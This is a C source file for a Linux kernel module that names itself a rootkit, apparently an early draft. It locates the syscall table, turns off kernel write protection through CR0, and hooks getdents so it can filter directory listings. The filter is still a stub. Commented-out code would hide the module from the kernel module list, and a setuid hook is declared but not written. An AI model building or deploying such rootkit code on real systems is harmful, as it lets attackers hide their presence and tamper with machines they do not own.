#include <linux/err.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/fdtable.h>
#include <linux/slab.h>
#include <linux/proc_ns.h>

//copied from "man 2 getdents"
struct linux_dirent {
           long           d_ino;
           off_t          d_off;
           unsigned short d_reclen;
           char           d_name[];
       };

#define HOOK(call_table, orig, newfun, index)	\
  orig = (void *)call_table[index];		\
  call_table[index] = (unsigned long*)&newfun

#define UNHOOK(call_table, orig, index)		\
  call_table[index] = (unsigned long*)orig

MODULE_LICENSE("GPL");

static int rootkit_init(void);
static void rootkit_exit(void);
static void disable_rw(void);
static void enable_rw(void);
//static void hide(void);
//static void unhide(void);

asmlinkage long (*old_getdents)(unsigned int fd,
				struct linux_dirent *dirp,
				unsigned int count);

asmlinkage long rootkit_getdents(unsigned int fd,
				 struct linux_dirent *dirp,
				 unsigned int count);


asmlinkage long rootkit_setuid(uid_t uid);
long rootkit_ls_filter(struct linux_dirent *dirp, long length);
asmlinkage long rootkit_getdents(unsigned int fd,
				 struct linux_dirent *dirp,
				 unsigned int count);

static unsigned long *sys_call_table;
//static struct list_head *module_previous;

static void enable_rw(void) {
  write_cr0(read_cr0() & (~X86_CR0_WP));
}

static void disable_rw(void) {
  write_cr0(read_cr0() | X86_CR0_WP);
}

long rootkit_ls_filter(struct linux_dirent *dirp, long length) {
  unsigned int offset = 0;
  struct linux_dirent *cur_dirp;
  while (offset < length) {
    cur_dirp = (struct linux_dirent *)((unsigned long) dirp + offset);
    offset += cur_dirp->d_reclen;
  } 
  return length;
}

asmlinkage long rootkit_getdents(unsigned int fd,
				 struct linux_dirent __user *dirp,
				 unsigned int count)
{
  int ret;
    
  ret = (*old_getdents)(fd, dirp, count);
  if (ret <= 0) {
    return ret;
  }
  ret = rootkit_ls_filter(dirp, ret);
  return ret;
}

/* static void hide(void) { */
/*   module_previous = THIS_MODULE->list.prev; */
/*   list_del(&THIS_MODULE->list); */
/*   kobject_del(&THIS_MODULE->mkobj.kojb); */
/* } */

/* static void unhide(void) { */
/*   list_add(&THIS_MODULE->list, module_previous); */
/*   kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, MODULE_NAME); */
/* } */

static int rootkit_init(void) {
  sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");

  if (sys_call_table == NULL) {
    printk(KERN_ERR "Couldnt look up sys_call_table\n");
    return -1;
  }
  else {
    printk("Found lookup table at %p\n", sys_call_table);
  }
  enable_rw();
  HOOK(sys_call_table, old_getdents, rootkit_getdents, __NR_getdents);
  disable_rw();
  
  return 0;
}

static void rootkit_exit(void) {
  enable_rw();
  UNHOOK(sys_call_table, old_getdents, __NR_getdents);
  disable_rw();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
